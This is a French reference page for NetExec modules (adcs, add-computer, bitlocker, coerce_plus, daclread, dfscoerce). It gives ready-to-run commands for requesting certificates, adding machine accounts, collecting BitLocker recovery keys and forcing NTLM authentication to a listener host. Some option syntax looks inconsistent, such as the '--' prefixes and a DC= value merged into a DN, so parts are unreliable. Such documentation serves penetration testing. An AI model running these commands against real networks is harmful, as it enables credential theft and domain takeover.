# Modules

### Documentation des Modules NetExec

Voici une documentation complète et détaillée de chaque module de NetExec, classée par ordre alphabétique. Chaque module est accompagné d'une description, du protocole pris en charge, des paramètres, des exemples de commandes typiques, ainsi que des usages avancés.

***

#### Module : `adcs`

**1. Nom du Module : `adcs`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'exploiter les Active Directory Certificate Services (ADCS) pour obtenir des certificats ou des informations sensibles.

**2. Options / Paramètres**

* `--CERTTEMPLATE` : Nom du modèle de certificat à utiliser.
* `--DC` : Contrôleur de domaine cible.
* `--OUTPUT` : Fichier de sortie pour les certificats obtenus.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate
```

**Explication** :

* Cette commande utilise le module `adcs` pour demander un certificat à l'Active Directory Certificate Services, avec le modèle `UserTemplate`.

**Commande avec fichier de sortie** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,OUTPUT=cert.pfx
```

**Explication** :

* Les certificats sont sauvegardés dans le fichier `cert.pfx`.

**4. Commandes Avancées**

Commande pour spécifier un contrôleur de domaine particulier :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,DC=dc.example.com
```

**Explication** :

* Exécute le module en ciblant le contrôleur de domaine `dc.example.com`.

***

#### Module : `add-computer`

**1. Nom du Module : `add-computer`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'ajouter un compte machine à un domaine Active Directory.

**2. Options / Paramètres**

* `--COMPUTERNAME` : Nom du compte machine à ajouter.
* `--PASSWORD` : Mot de passe associé au compte machine.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123
```

**Explication** :

* Ajoute un compte machine nommé `NewComputer` avec le mot de passe `Password123` sur le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123,DC=dc.example.com
```

**Explication** :

* Ajoute le compte machine sur le contrôleur de domaine `dc.example.com`.

***

#### Module : `bitlocker`

**1. Nom du Module : `bitlocker`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les cibles pour collecter des informations sur BitLocker, y compris les clés de récupération.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour sauvegarder les informations collectées.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker
```

**Explication** :

* Récupère les informations BitLocker de la cible à l’adresse `192.168.1.10`.

**Commande avec fichier de sortie** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o OUTPUT=bitlocker_info.txt
```

**Explication** :

* Sauvegarde les informations collectées dans `bitlocker_info.txt`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o VERBOSE=1
```

**Explication** :

* Fournit une sortie plus détaillée des informations collectées.

***

#### Module : `coerce_plus`

**1. Nom du Module : `coerce_plus`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise des méthodes de coercition pour forcer une cible à s’authentifier sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur où rediriger l’authentification.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Utilise la coercition pour forcer la cible `192.168.1.10` à s’authentifier sur l’hôte `192.168.1.20`.

**Commande avec sortie détaillée** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée pour le débogage.

**4. Commandes Avancées**

Commande multi-cibles :

```bash
nxc smb targets.txt -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Applique la coercition à toutes les cibles listées dans `targets.txt`.

***

#### Module : `daclread`

**1. Nom du Module : `daclread`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module extrait les listes de contrôle d'accès discrétionnaire (DACL) pour des objets Active Directory spécifiés.

**2. Options / Paramètres**

* `--OBJECT` : Nom de l'objet cible pour lequel les DACL doivent être extraits.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com
```

**Explication** :

* Extrait les DACL pour l'objet `CN=Users,DC=example,DC=com` depuis le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com,DC=dc.example.com
```

**Explication** :

* Extrait les DACL pour un objet spécifique et les récupère depuis `dc.example.com`.

***

#### Module : `dfscoerce`

**1. Nom du Module : `dfscoerce`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite une vulnérabilité dans le service DFS pour forcer une authentification NTLM sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les authentifications NTLM.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20
```

**Explication** :

* Exploite la vulnérabilité DFS pour forcer une authentification NTLM de la cible `192.168.1.10` vers l’hôte `192.168.1.20`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit des informations supplémentaires pendant l'exécution du module.
